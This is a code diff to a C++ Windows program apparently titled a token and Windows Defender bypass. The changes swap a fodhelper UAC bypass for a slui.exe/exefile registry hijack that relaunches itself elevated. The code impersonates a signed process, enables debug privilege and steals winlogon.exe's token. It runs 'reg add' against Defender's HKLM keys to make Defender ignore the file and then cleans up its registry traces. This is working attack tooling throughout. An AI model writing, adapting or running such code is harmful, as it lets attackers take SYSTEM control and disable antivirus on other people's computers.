@@ -18,7 +18,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
       fprintf(stderr, "[-] No signed process found to impersonate.\n");
       return 1;
     }
-    printf("[+] Selected process: %ls (PID %lu)\n\n", target.exeName.c_str(), target.pid);
+    printf("[+] Selected process: %ws (PID %lu)\n\n", target.exeName.c_str(), target.pid);
 
     // Read info from the target.
     ProcessStrings info;
@@ -28,10 +28,9 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     }
 
     printf("[*] Read from target process:\n");
-    printf("    CommandLine   : %ls\n", info.commandLine.c_str());
-    printf("    ImagePathName : %ls\n", info.imagePathName.c_str());
-    printf("    WindowTitle   : %ls\n\n", info.windowTitle.c_str());
-    fflush(stdout);
+    printf("    CommandLine   : %ws\n", info.commandLine.c_str());
+    printf("    ImagePathName : %ws\n", info.imagePathName.c_str());
+    printf("    WindowTitle   : %ws\n\n", info.windowTitle.c_str());
 
     // Apply to ourselves.
     ApplyToCurrentProcess(info);
@@ -40,39 +39,33 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
     // HKEY_CURRENT_USER
     //   Software
     //     Classes
-    //       ms-settings
-    //         Shell
-    //           Open
+    //       exefile
+    //         shell
+    //           open
     //             command
-    //               @=current_file.exe
-    //               DelegateExecute=""
+    //               @=Payload
 
     // Create registry tree
-    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"ms-settings");
-    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings",
-                      L"Shell");
-    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell",
-                      L"Open");
+    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes", L"exefile");
+    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile",
+                      L"shell");
+    CreateRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell",
+                      L"open");
     CreateRegistryKey(HKEY_CURRENT_USER,
-                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"command");
+                      L"Software\\Classes\\exefile\\shell\\open", L"command");
 
     // Set payload
+    // Any executable can be used. File drops can, however, be avoided
+    // completely if system binaries suffice.
+
     SetRegistryValue(HKEY_CURRENT_USER,
-                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"",
+                     L"Software\\Classes\\exefile\\shell\\open\\command", L"",
                      GetCurrentFile());
-    
-    // Create DelegateExecute registry value
-    SetRegistryValue(HKEY_CURRENT_USER,
-                     L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"DelegateExecute",
-                     L"");
-    
-    printf("[*] Writing registry keys...\n"); fflush(stdout);
-    // Start fodhelper.exe with "runas" verb
-    printf("[*] Launching fodhelper.exe...\n"); fflush(stdout);
-    ShellExecuteW(NULL, L"open", L"C:\\Windows\\System32\\fodhelper.exe", NULL,
+
+    // Start slui.exe with "runas" verb
+    ShellExecuteW(NULL, L"runas", L"C:\\Windows\\System32\\slui.exe", NULL,
                   NULL, SW_SHOWNORMAL);
-    Sleep(2000);
-    printf("[+] Done.\n"); fflush(stdout);
+    Sleep(1000);
   } else {
     if (IsDefenderRunning()) {
       // make window defender ignore this file at all cost
@@ -87,7 +80,7 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 
     if (!SetPrivilege(SE_DEBUG_NAME))
       return -1;
-    DWORD pid = GetPIDByName("winlogon.exe"); // TODO: find a random process everytime that match winlogon.exe permissions
+    DWORD pid = GetPIDByName("winlogon.exe");
     HANDLE cToken = GetToken(pid);
     LPCWSTR processes[] = {
         L"C:\\Windows\\System32\\reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows "
@@ -103,14 +96,14 @@ int CALLBACK WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
         return -1;
     }
     DeleteRegistryKey(HKEY_CURRENT_USER,
-                      L"Software\\Classes\\ms-settings\\Shell\\Open", L"DelegateExecute");
-    DeleteRegistryKey(HKEY_CURRENT_USER,
-                      L"Software\\Classes\\ms-settings\\Shell\\Open\\command", L"");
+                      L"Software\\Classes\\exefile\\shell\\open", L"command");
+    DeleteRegistryKey(HKEY_CURRENT_USER, L"Software\\Classes\\exefile\\shell",
+                      L"open");
   }
   // Delete registry keys, but only from \Software\Classes\exefile\shell to not
   // interfere with other application handlers
 
   return 0;
 }
-// x86_64-w64-mingw32-g++ --static script.cpp -o main.exe
+// x86_64-w64-mingw32-g++ --static token_windefender_bypass.cpp -o main.exe
 // -mwindows
